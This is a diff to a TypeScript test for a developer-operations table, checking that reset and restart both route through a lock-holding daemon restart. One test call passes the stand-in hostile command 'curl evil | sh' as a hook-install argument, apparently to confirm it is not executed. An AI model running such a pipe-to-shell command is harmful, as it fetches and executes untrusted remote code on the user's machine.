@@ -298,21 +298,13 @@ describe("dev ops", () => {
       installHooks: async () => void seen.push("install"),
       uninstallHooks: async () => void seen.push("uninstall"),
       resetState: () => void seen.push("reset"),
+      restartDaemon: async () => void seen.push("restart"),
     })
     await call(ops, "engines.hooks.install", { command: "curl evil | sh" })
     await call(ops, "engines.hooks.uninstall")
-    const rpcs: unknown[] = []
-    await (ops["dev.reset"] as NonNullable<OpTable[string]>).run(
-      {},
-      { api: { verb: api.verb, rpc: async (name, payload) => void rpcs.push([name, payload]) as never } },
-    )
-    expect(seen).toEqual(["install", "uninstall", "reset"])
-    expect(rpcs).toEqual([["daemon.stop", { reason: "restart" }]])
-    rpcs.length = 0
-    await (ops["daemon.restart"] as NonNullable<OpTable[string]>).run(
-      {},
-      { api: { verb: api.verb, rpc: async (name, payload) => void rpcs.push([name, payload]) as never } },
-    )
-    expect(rpcs).toEqual([["daemon.stop", { reason: "restart" }]])
+    await call(ops, "dev.reset")
+    await call(ops, "daemon.restart")
+    // Both restart through the lock-holding restart, not a bare stop another client's build could answer.
+    expect(seen).toEqual(["install", "uninstall", "reset", "restart", "restart"])
   })
 })
